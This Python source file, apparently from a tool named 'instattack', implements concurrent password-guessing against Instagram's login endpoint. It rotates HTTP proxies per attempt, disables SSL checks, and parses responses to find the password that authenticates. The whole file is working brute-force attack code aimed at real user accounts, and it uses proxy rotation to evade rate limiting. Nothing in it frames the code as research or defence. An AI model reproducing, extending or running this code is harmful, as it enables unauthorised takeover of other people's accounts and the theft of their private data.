import asyncio

from instattack.lib import logger
from instattack.lib.utils import limit_as_completed, cancel_remaining_tasks

from instattack.config import settings, config

from instattack.app.exceptions import (
    PoolNoProxyError, InstagramResultError, HTTP_RESPONSE_ERRORS,
    HTTP_REQUEST_ERRORS)

from .models import InstagramResult


async def login(
    loop,
    request_context,
    proxy,
    on_proxy_response_error=None,
    on_proxy_request_error=None,
    on_proxy_success=None,
):
    """
    For a given password, makes a series of concurrent requests, each using
    a different proxy, until a result is found that authenticates or dis-
    authenticates the given password.

    [x] TODO
    --------
    Only remove proxy if the error has occured a certain number of times, we
    should allow proxies to occasionally throw a single error.

    [x] TODO
    --------
    We shouldn't really need this unless we are running over large numbers
    of requests... so hold onto code.  Large numbers of passwords might lead
    to this RuntimeError:

    RuntimeError: File descriptor 87 is used by transport
    <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>

    >>> except RuntimeError as e:
    >>>     if e.errno == 87:
    >>>         e = HttpFileDescriptorError(original=e)
    >>>         await self.communicate_request_error(e, proxy, scheduler)
    >>>     else:
    >>>         raise e
    """
    log = logger.get_async(__name__, subname='login')

    proxy.update_time()
    result = None

    async def parse_response_result(result, password, proxy):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        result = InstagramResult.from_dict(result, proxy=proxy, password=password)
        if result.has_error:
            raise InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise InstagramResultError("Inconslusive result.")
            return result

    async def raise_for_result(response):
        """
        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        if response.status != 400:
            response.raise_for_status()
            json = await response.json()
            result = await parse_response_result(json, request_context['password'], proxy)
            return result
        else:
            # Parse JSON First
            json = await response.json()
            try:
                return await parse_response_result(json, request_context['password'], proxy)  # noqa
            except InstagramResultError as e:
                # Be Careful: If this doesn't raise a response the result will be None.
                response.raise_for_status()

    try:
        async with request_context['session'].post(
            settings.INSTAGRAM_LOGIN_URL,
            headers=settings.HEADERS(request_context['token']),
            data={
                settings.INSTAGRAM_USERNAME_FIELD: loop.user.username,
                settings.INSTAGRAM_PASSWORD_FIELD: request_context['password']
            },
            ssl=False,
            proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
        ) as response:
            result = await raise_for_result(response)
            await on_proxy_success(proxy)

    except asyncio.CancelledError:
        pass

    except HTTP_RESPONSE_ERRORS as e:
        if config['log.logging'].get('request_errors') is True:
            await log.error(e, extra={'proxy': proxy})
        await on_proxy_response_error(proxy, e)

    except HTTP_REQUEST_ERRORS as e:
        if config['log.logging'].get('request_errors') is True:
            await log.error(e, extra={'proxy': proxy})
        await on_proxy_request_error(proxy, e)

    return result


async def attempt(
    loop,
    request_context,
    pool=None,
    on_proxy_response_error=None,
    on_proxy_request_error=None,
    on_proxy_success=None
):
    """
    Makes concurrent fetches for a single password and limits the number of
    current fetches to the batch_size.  Will return when it finds the first
    request that returns a valid result.
    """
    async def generate_login_attempts():
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while True:
            proxy = await pool.get()
            if not proxy:
                raise PoolNoProxyError()

            yield login(
                loop,
                request_context,
                proxy,
                on_proxy_request_error=on_proxy_request_error,
                on_proxy_response_error=on_proxy_response_error,
                on_proxy_success=on_proxy_success,
            )

    # TODO:  We should figure out a way to allow proxies to repopulate and wait
    # on them for large number of password requests.  We don't want to bail when
    # there are no more proxies because we might be using them all currently

    # Wait for start event to signal that we are ready to start making
    # requests with the proxies.
    gen = generate_login_attempts()

    # Stop Event: Notifies limit_as_completed to stop creating additional tasks
    # so that we can cancel the leftover ones.
    stop_event = asyncio.Event()

    batch_size = config['attempts']['batch_size']
    async for result, num_tries, current_tasks in limit_as_completed(gen, batch_size, stop_event):
        if result is not None:
            stop_event.set()

            # TODO: Maybe Put in Scheduler - We also might not need to do this.
            await cancel_remaining_tasks(futures=current_tasks)
            return result, num_tries
